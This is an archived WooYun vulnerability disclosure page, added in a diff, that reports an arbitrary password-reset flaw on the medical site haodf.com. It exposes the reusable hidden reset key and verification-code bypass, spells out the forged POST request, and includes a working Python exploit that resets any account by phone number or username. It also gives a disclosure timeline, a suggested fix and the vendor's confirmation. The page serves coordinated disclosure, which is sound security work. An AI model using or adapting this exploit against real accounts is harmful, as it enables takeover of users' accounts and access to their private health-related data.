@@ -1,0 +1,257 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		好大夫重置任意用户，附EXP  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		好大夫重置任意用户，附EXP  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/fox">fox</a> 
+</li><li>提交时间：		2013-01-31 00:05</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-01-31：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-01-31：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-02-10：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-02-20：	细节向普通白帽子公开<br/>
+									2013-03-02：	细节向实习白帽子公开<br/>
+									2013-03-17：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">礼物求给力</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1、通过手机号重置<br />
+<br />
+</p><pre><code>http://passport.haodf.com/user/resetpassword</code></pre><p class='detail'><br />
+<br />
+通过此网址，可用邮箱或手机号找回密码<br />
+<br />
+当我们选择手机号找密码时，网页跳转到如下地址，要求输入用户名和手机验证码<br />
+<br />
+</p><pre><code>http://passport.haodf.com/user/sendpasswordsucc?type=mobile&amp;username=xxxxxxx</code></pre><p class='detail'><br />
+<br />
+可以看出，这时用户名会直接出现在网页地址栏内，且验证码可以绕过<br />
+<br />
+（BTW，手机验证码可以反复使用， 似乎在很长一段时间内都不会过期）<br />
+<br />
+查看网页源代码，找到</p><pre><code>&lt;input name=&quot;key&quot; type=&quot;hidden&quot; id=&quot;key&quot; value=&quot;DE4rXvQaMCGXBC3UMxQRXXXXXXXXNCEnO8iGq8jhOf0b&quot; /&gt;</code></pre><p class='detail'><br />
+<br />
+这个key就是用来重置密码的key<br />
+<br />
+<br />
+<br />
+然后构造一个post请求，地址为</p><pre><code>http://passport.haodf.com/user/confirmpassword</code></pre><p class='detail'><br />
+<br />
+数据为</p><pre><code>password=123123&amp;confirmPassword=123123&amp;key=XXXXXX</code></pre><p class='detail'><br />
+<br />
+即可重置该用户密码<br />
+<br />
+<br />
+<br />
+2、通过用户名重置<br />
+<br />
+网址本身没用提供此功能， 但可以从上面的中间网址进入，即可通过用户名重置<br />
+<br />
+</p><pre><code>http://passport.haodf.com/user/sendpasswordsucc?type=mobile&amp;username=xxxxxxx</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+3、通过邮箱重置<br />
+<br />
+类似1中通过手机号重置 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">附一个python写的简单EXP<br />
+<br />
+</p><pre><code>#encoding=utf8<br />
+username = &#039;init&#039;<br />
+<br />
+class MyHTTPRedirectHandler(urllib2.HTTPRedirectHandler):<br />
+    def http_error_302(self, req, fp, code, msg, httpmsg):<br />
+        for header in httpmsg.headers:        <br />
+            if header.count(&#039;username=&#039;) &gt; 0:<br />
+                global username<br />
+                username = header[header.index(&#039;username=&#039;)+9: header.index(&#039;\r\n&#039;)]<br />
+        return urllib2.HTTPRedirectHandler.http_error_302(self, req, fp, code, msg, httpmsg)<br />
+<br />
+import urllib, urllib2, ConfigParser, time, winsound<br />
+<br />
+def ResetByPhone(phone):<br />
+    resetpwd_url = &#039;http://passport.haodf.com/user/resetpassword&#039;<br />
+    submit_url = &#039;http://passport.haodf.com/user/confirmpassword&#039;<br />
+<br />
+    req = urllib2.Request(resetpwd_url, &#039;input=%s&#039; % phone)<br />
+    opener = urllib2.build_opener(MyHTTPRedirectHandler)<br />
+    response = opener.open(req)<br />
+    the_page = response.read()<br />
+    key = the_page[ the_page.index(&#039;id=&quot;key&quot;&#039;)+16 : ]<br />
+    key = key[: key.index(&#039;&quot;&#039;)]<br />
+<br />
+    req = urllib2.Request(submit_url, &#039;password=%s&amp;confirmPassword=%s&amp;key=%s&#039; % (phone,phone,key))<br />
+    response = urllib2.urlopen(req)<br />
+    #print response.read()<br />
+<br />
+def ResetByUsername(uname):<br />
+    resetpwd_url = &#039;http://passport.haodf.com/user/sendpasswordsucc&#039;<br />
+    submit_url = &#039;http://passport.haodf.com/user/confirmpassword&#039;<br />
+<br />
+    req = urllib2.Request(resetpwd_url, &#039;type=mobile&amp;username=%s&#039; % uname)<br />
+    response = urllib2.urlopen(req)<br />
+    the_page = response.read()<br />
+    key = the_page[ the_page.index(&#039;id=&quot;key&quot;&#039;)+16 : ]<br />
+    key = key[: key.index(&#039;&quot;&#039;)]<br />
+<br />
+    req = urllib2.Request(submit_url, &#039;password=%s&amp;confirmPassword=%s&amp;key=%s&#039; % (uname,uname,key))<br />
+    response = urllib2.urlopen(req)<br />
+    #print response.read()<br />
+<br />
+ResetByPhone(&#039;13912341234&#039;)<br />
+ResetByUsername(&#039;testuser&#039;)</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/302141456656f6f6710aff993ed0176c6857b120.jpg" target="_blank"><img src="../images/302141456656f6f6710aff993ed0176c6857b120.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/302142215936f7283df4e7f533158b769c8814e5.jpg" target="_blank"><img src="../images/302142215936f7283df4e7f533158b769c8814e5.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">把key隐藏<br />
+<br />
+设置验证码失效机制 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/fox" title="fox">fox</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-018136" title="好大夫重置任意用户，附EXP">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2013-01-31 11:47</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">和之前重置密码的漏洞类似，不过不是同一个点，我们正在改，不过还是鼓励，毕竟是独立发现的问题。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="18136";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
